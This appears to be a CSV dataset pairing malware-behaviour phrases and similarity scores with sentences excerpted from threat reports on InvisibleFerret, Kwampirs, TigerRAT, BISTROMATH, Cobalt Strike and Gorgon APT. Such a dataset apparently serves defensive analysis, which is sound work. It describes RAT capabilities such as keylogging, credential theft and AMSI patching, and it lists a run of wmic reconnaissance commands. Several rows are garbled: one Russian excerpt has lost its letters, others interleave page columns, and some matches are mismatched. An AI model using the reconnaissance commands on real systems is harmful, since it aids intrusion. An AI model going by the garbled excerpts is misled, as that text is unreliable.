phrase|similarity|adjacent_sentences
Command Line Execution|0.7597022778990548|"['Diagram for a heartbeat C2 message.', 'The C2 server returns JSON data instructing the backdoor with the next actions to take.', 'The JSON response contains the same two main keys: code: A value specifying an action or command args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.', 'Command Description Checks if the args value is equal to delete and if so, closes the session.', 'To notify the C2 server, it ssh_cmd sends the message string [close].', 'Command execution.', ""Extracts the command value from args['cmd'] and runs it."", 'JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.']"
WMIC|0.773524739341554|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
WMIC|0.8601303879519202|[]
WMIC|0.8836392615299994|['This module executes a series of commands to gather additional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the commands are not identical to the analogous module examined in the initial Symantec report.', 'These commands executed by this module are almost all wmic commands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snippet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypass configuration arrays with an iterator (v2).', 'Shamoon 1, 2 and 3 and Kwampirs, all contain arrays for C2, and Proxy, ProxyByPass, and accessType information.', 'INDEX cylera.com24 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAddress, EndingAddress wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconnector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snippet 9: Kwampirs commands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it seems likely that the use of this module is intended for a reconnaissance phase.', 'The types of information gathered may imply that the physical attributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be inferred from this information.', 'INDEX cylera.com25 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon 5.1.5 Artifact Similarities File Metadata The metadata of the dropper and reporter components (DLL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamoon (Figures 30, 31, 32 and 33), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Dropper Shamoon Dropper Figure 30: Kwampirs dropper metadata Figure 31: Shamoon dropper metadata INDEX cylera.com26 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon Kwampirs Reporter Shamoon Reporter Figure 32: Kwampirs reporter metadata Figure 33: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples looks different and contains many different tools.']
delete important files|0.7776668617012203|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
Themida-packed|0.8186853125341216|['Initial infection is carried out via a malicious executable.', 'An embedded bitmap image (contained in the trojan) is decoded into shellcode upon execution, thus loading the implant.', 'Network communications are encrypted via XOR.', 'The analyzed BISTROMATH samples, along with the other families all attempt to evade analysis via common sandboxes (VIRTUALBOX, QEMU, VMware) via multiple artifact checks (presence of specific devices, registry entries, processes, files).Core functionality includes: File and Process manipulation File/Data upload/exfiltration Timestamp modification/masquerading Service start/stop CMD shell access / use Screenshot Capture Microphone Capture Webcam Control Keylogging Browser hijacking/form grabbing Exfiltration of cached credentials Self-management (update/uninstall)HOPLIGHTProxy payload to obfuscate and/or re-route traffic between infected hosts and C2.', 'Traffic is encrypted over SSL, and the individual payloads are capable of generating fake SSL Certificates.', 'Analyzed samples are Themida packed.', 'One of the examples (SHA256: d77fdabe17cdba62a8e728cbe6c740e2c2e541072501f77988674e07a05dfb39) provided by CISA contained a public SSL certificate and encrypted payload.SLICKSHOESSLICKSHOES is typically utilized as a loader/Dropper.', 'The malware writes itself to C:WindowsWebtaskenc.exe.', 'Separate processes are responsible for the manipulation and execution of the dropped executable.', 'SLICKSHOES is a full beacon-style implant (similar to Cobalt Strike).Makes use of bespoke encoding methods and is capable of RAT-like functionality.', 'File and Process manipulation System recon and exfiltration Input capture Command/process execution and manipulationSLICKSHOES communicates to a hardcoded C2 address (188[.]165[.]37[.']
upload/download file|0.7907829044012105|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
upload/download file|0.8084070252298003|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
Obfuscated PowerShell script|0.7796168383819737|['but we still needed to go one layer deeper and verify the 1:54114 MALWARE-OTHER Html.Trojan.CobaltStrike shellcode was unique in this module.', 'We base64-decode powershell payload download attempt the data and decrypt it using the same `0x23` default 1:54115 MALWARE-OTHER Html.Trojan.CobaltStrike XOR key and its already much larger than the previous powershell payload download attempt payload.', 'Lastly, we have the VBA Method.', 'Our researchers found Its not raw shellcode like we saw in the HTA payloads, this easy to cover because HTA files dont often interface you can immediately see that the MZ header is present.', 'with Excel workbooks, let alone one that tinkers with the This seems to be a stageless beacon included in the AccessVBOM registry key.', 'powershell script.', 'You might wonder why it wasnt included in the HTA attack.', 'The reason is the HTA module 1:54116 MALWARE-OTHER Html.Trojan.CobaltStrike is executing a Powershell one-liner and Windows has VBA payload download attempt a character limit on command line strings, 32767.', 'That 1:54117 MALWARE-OTHER Html.Trojan.CobaltStrike number is even lower when executing a command from VBA payload download attempt `cmd.exe`, 8191.', 'The character limit varies across a variety of execution methods and these numbers are not always From there, we cloned all that to ClamAV coverage to get going to be correct.', 'the following signatures: Html.Trojan.CobaltStrike-7932561-0 Since this payload is downloaded using a small one-liner to execute a string retrieved from the Cobalt Strike controlled Html.Trojan.CobaltStrike-7932562-0 server, that limit is bypassed and a more reliable payload Html.Trojan.CobaltStrike-7932563-0 can be provided.']
Obfuscated PowerShell script|0.7622235917995965|['Figure 8: Return address, overwritten with WinExec VBScript Analysis: https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 6/128/12/2020 Gorgon APT targeting MSME sector in India After successful exploitation, cmd.exe is executed with commands: /c cscript %tmp%\\\\ServerCrypted.vbs >> AC This command creates a cscript.exe process to execute code in ServerCrypted.vbs.', 'VBScript file was already dropped in %temp% folder by WinWord process.', 'Below Figure shows the VBScript code.', 'As shown in figure 9 and figure 10, actors used some AV- vendors names in function names, variable names, and strings.', 'This VBScript is responsible to execute two processes, cmd.exe and powershell.exe.', 'Figure 10 shows the obfuscated PowerShell script.', 'Figure 9: Contents of ServerCrypted.vbs https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 7/128/12/2020 Gorgon APT targeting MSME sector in India Figure 10: Contents of ServerCrypted.vbs PowerShell Analysis: Figure 11 shows the de-obfuscated PowerShell script.', 'As shown below, the script downloads two files with a .jpg extension.', 'First file 15882060891.jpg is a PowerShell script which contains encoded injector DLL written in C#, as shown in figure 12.', 'This DLL is loaded in-memory by PowerShell.', 'In this script, actors used some interesting names of class and function of injector DLL like FlorianRoth and Cyb3rOps.']
